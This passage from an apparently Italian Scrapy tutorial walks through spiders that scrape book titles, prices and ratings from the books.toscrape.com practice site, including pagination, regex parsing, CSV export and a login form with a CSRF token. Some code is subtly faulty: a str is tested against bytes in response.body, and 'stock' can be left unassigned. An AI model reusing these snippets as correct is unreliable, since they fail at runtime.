                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rating&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.star-rating::attr(class)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice mostra come creare uno spider chiamato &amp;ldquo;bookspider&amp;rdquo; utilizzando il modulo Scrapy in Python. Lo spider inizia a navigare nell&amp;rsquo;indirizzo web specificato in &amp;ldquo;start_urls&amp;rdquo;, che in questo caso è &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La funzione parse() viene chiamata per ogni pagina visitata dallo spider e consente di analizzare il contenuto della pagina. In questo esempio, la funzione parse() utilizza il metodo &amp;ldquo;css&amp;rdquo; per selezionare tutti gli elementi HTML con la classe &amp;ldquo;product_pod&amp;rdquo; e li itera uno per uno.&lt;/p&gt;
&lt;p&gt;Per ogni elemento, vengono estratte tre informazioni:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Il titolo del libro utilizzando il selettore &amp;ldquo;h3 &amp;gt; a::text&amp;rdquo;, che seleziona il testo all&amp;rsquo;interno del tag &amp;ldquo;a&amp;rdquo; immediatamente figlio del tag &amp;ldquo;h3&amp;rdquo; all&amp;rsquo;interno dell&amp;rsquo;elemento &amp;ldquo;article”&lt;/li&gt;
&lt;li&gt;Il prezzo utilizzando il selettore &amp;ldquo;.price_color::text&amp;rdquo;, che seleziona il testo all&amp;rsquo;interno del tag con classe &amp;ldquo;price_color&amp;rdquo; all&amp;rsquo;interno dell&amp;rsquo;elemento &amp;ldquo;article”&lt;/li&gt;
&lt;li&gt;La valutazione utilizzando il selettore &amp;ldquo;.star-rating::attr(class)&amp;rdquo;, che seleziona il valore dell&amp;rsquo;attributo &amp;ldquo;class&amp;rdquo; del tag con classe &amp;ldquo;star-rating&amp;rdquo; all&amp;rsquo;interno dell&amp;rsquo;elemento &amp;ldquo;article&amp;rdquo;. Poi si utilizza il metodo &amp;ldquo;split&amp;rdquo; per dividere la stringa in una lista di stringhe, e si prende l&amp;rsquo;ultima parte della stringa cioè l&amp;rsquo;ultimo elemento della lista.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tutte queste informazioni vengono quindi restituite come un dizionario utilizzando il comando &amp;ldquo;yield&amp;rdquo; all&amp;rsquo;interno del ciclo for.&lt;/p&gt;
&lt;h2 id=&#34;estrazione-di-tutte-le-informazioni-sui-libri-da-più-pagine-web&#34;&gt;Estrazione di tutte le informazioni sui libri da più pagine web&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MultiPageBookSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multipagebookspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rating&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.star-rating::attr(class)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
            }
        next_page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;li.next &amp;gt; a::attr(href)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; next_page &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;follow(next_page, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice è un esempio di uno spider Scrapy che utilizza un ciclo for per estrarre informazioni da più pagine di un sito web.&lt;/p&gt;
&lt;p&gt;Il nome dello spider è &lt;em&gt;multipagebookspider&lt;/em&gt; e la pagina iniziale da cui inizia la scansione è &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La funzione &lt;strong&gt;parse&lt;/strong&gt; è chiamata per ogni pagina e utilizza il metodo css per estrarre informazioni sui libri dalla pagina (titolo, prezzo e valutazione).&lt;/p&gt;
&lt;p&gt;Successivamente, utilizza il metodo css per estrarre il link alla prossima pagina e utilizza il metodo &lt;em&gt;response.follow&lt;/em&gt; per seguire il link e chiamare nuovamente la funzione &lt;em&gt;parse&lt;/em&gt; per la pagina successiva. Ciò consente allo spider di continuare a estrarre informazioni dalle pagine successive finché non viene raggiunta la fine del sito.&lt;/p&gt;
&lt;h2 id=&#34;estrazione-di-informazioni-sui-libri-da-una-pagina-web-utilizzando-unespressione-regolare&#34;&gt;Estrazione di informazioni sui libri da una pagina web utilizzando un&amp;rsquo;espressione regolare&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;RegexBookSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;regexbookspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            title &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            price &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            rating &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.star-rating::attr(class)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            availability &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p.availability::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            match &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;search(&lt;span style=&#34;color:#e6db74&#34;&gt;r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\d+&amp;#39;&lt;/span&gt;, availability)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; match:
                stock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(match&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;group(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: title,
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: price,
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rating&amp;#34;&lt;/span&gt;: rating,
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stock&amp;#34;&lt;/span&gt;: stock
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo è un esempio di codice scritto in Python utilizzando la libreria Scrapy per creare un spider chiamato &lt;em&gt;RegexBookSpider&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;In particolare, questo spider è impostato per iniziare la navigazione nella pagina &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt; e utilizza l&amp;rsquo;espressione regolare (regex) per estrarre informazioni sul numero di copie disponibili di ciascun libro.&lt;/p&gt;
&lt;p&gt;Il metodo parse è chiamato per ogni pagina visitata dallo spider e utilizza il selettore CSS per selezionare i dati di interesse nella pagina. In questo caso, il spider estrae il titolo, il prezzo, la valutazione e la disponibilità di ogni libro. L&amp;rsquo;espressione regolare re.search(r&#39;\d+&#39;, availability) è utilizzata per cercare una corrispondenza di un numero intero all&amp;rsquo;interno della stringa di disponibilità. Se una corrispondenza viene trovata, il numero di stock disponibili viene salvato in una variabile chiamata &amp;ldquo;stock&amp;rdquo;. Infine, le informazioni estratte vengono restituite come un dizionario.&lt;/p&gt;
&lt;h2 id=&#34;estrazione-di-informazioni-sui-libri-da-una-pagina-web-e-salvataggio-in-formato-csv&#34;&gt;Estrazione di informazioni sui libri da una pagina web e salvataggio in formato CSV&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BookSpiderCSV&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bookspidercsv&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
    ]

    custom_settings &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FEED_FORMAT&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;csv&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FEED_URI&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;books.csv&amp;#34;&lt;/span&gt;,
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rating&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.star-rating::attr(class)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questo codice è un esempio di uno spider Scrapy che raccoglie informazioni sui libri presenti su un sito web di esempio &amp;ldquo;&lt;a href=&#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html%22&#34;&gt;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;quot;&lt;/a&gt; e le salva in un file CSV. Il nome dello spider è &amp;ldquo;bookspidercsv&amp;rdquo; e la classe principale è &lt;em&gt;BookSpiderCSV&lt;/em&gt; che estende la classe base &lt;em&gt;scrapy.Spider&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La proprietà &lt;strong&gt;start_urls&lt;/strong&gt; specifica l&amp;rsquo;URL iniziale del sito web da cui lo spider inizierà a raccogliere i dati.&lt;/p&gt;
&lt;p&gt;La funzione &lt;em&gt;parse&lt;/em&gt; viene eseguita per ogni pagina del sito web raccolta dallo spider. In questo caso, utilizza il metodo &lt;strong&gt;response.css&lt;/strong&gt; per selezionare tutti gli elementi HTML con la classe &lt;em&gt;product_pod&lt;/em&gt; dalla pagina, che rappresentano i libri. Per ogni libro, raccoglie il titolo, il prezzo e la valutazione utilizzando il metodo &amp;ldquo;css&amp;rdquo; e salva i dati raccolti in un dizionario.&lt;/p&gt;
&lt;p&gt;La proprietà &lt;em&gt;custom_settings&lt;/em&gt; imposta il formato del file di output e il nome del file di output. In questo caso, il formato è impostato su &lt;em&gt;csv&lt;/em&gt; e il nome del file su &lt;strong&gt;books.csv&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Alla fine, tutti i dati raccolti dalla funzione &lt;em&gt;parse&lt;/em&gt; vengono scritti nel file CSV &lt;strong&gt;books.csv&lt;/strong&gt; nella cartella radice del progetto.&lt;/p&gt;
&lt;h2 id=&#34;scraping-di-dati-da-più-siti&#34;&gt;Scraping di dati da più siti&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MultiSiteBookSpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multisitebookspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_22/index.html&amp;#34;&lt;/span&gt;,
                  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://books.toscrape.com/catalogue/category/books/science_23/index.html&amp;#34;&lt;/span&gt;]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; book &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;article.product_pod&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 a::attr(title)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p.price_color::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo esempio, lo spider utilizza un elenco di URL di partenza start_urls che contiene più di un sito web. Utilizzando un solo metodo parse() per estrarre i dati, lo spider esegue la scansione di entrambi i siti web specificati nel elenco e estrae i dati dei libri dalle pagine web.&lt;/p&gt;
&lt;h2 id=&#34;scraping-di-dati-da-una-pagina-con-autenticazione&#34;&gt;Scraping di dati da una pagina con autenticazione&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; scrapy
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scrapy.http &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; FormRequest

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MySpider&lt;/span&gt;(scrapy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Spider):
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;myspider&amp;#34;&lt;/span&gt;
    start_urls &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://mywebsite.com/login&amp;#34;&lt;/span&gt;,
    ]

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#75715e&#34;&gt;# estraiamo il token CSRF dalla pagina di login&lt;/span&gt;
        csrf_token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input[name=&amp;#39;csrf_token&amp;#39;]::attr(value)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()

        &lt;span style=&#34;color:#75715e&#34;&gt;# creiamo una richiesta di form con i dati di login e il token CSRF&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; FormRequest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_response(response, formdata&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{
            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;myusername&amp;#34;&lt;/span&gt;,
            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mypassword&amp;#34;&lt;/span&gt;,
            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;csrf_token&amp;#34;&lt;/span&gt;: csrf_token
        }, callback&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;after_login)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;after_login&lt;/span&gt;(self, response):
        &lt;span style=&#34;color:#75715e&#34;&gt;# controlliamo se siamo stati autenticati con successo&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Incorrect username or password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;body:
            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;logger&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login fallito&amp;#34;&lt;/span&gt;)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;

        &lt;span style=&#34;color:#75715e&#34;&gt;# se siamo stati autenticati con successo, possiamo iniziare a fare scraping&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; item &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;div.item&amp;#34;&lt;/span&gt;):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; {
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;: item&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;h3 &amp;gt; a::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;price&amp;#34;&lt;/span&gt;: item&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;span.price::text&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(),
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;image_url&amp;#34;&lt;/span&gt;: item&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;img::attr(src)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
            }

        &lt;span style=&#34;color:#75715e&#34;&gt;# e possiamo anche seguire i link per le pagine successive&lt;/span&gt;
        next_page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;css(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a.next_page::attr(href)&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; next_page &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;follow(next_page, self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;after_login)
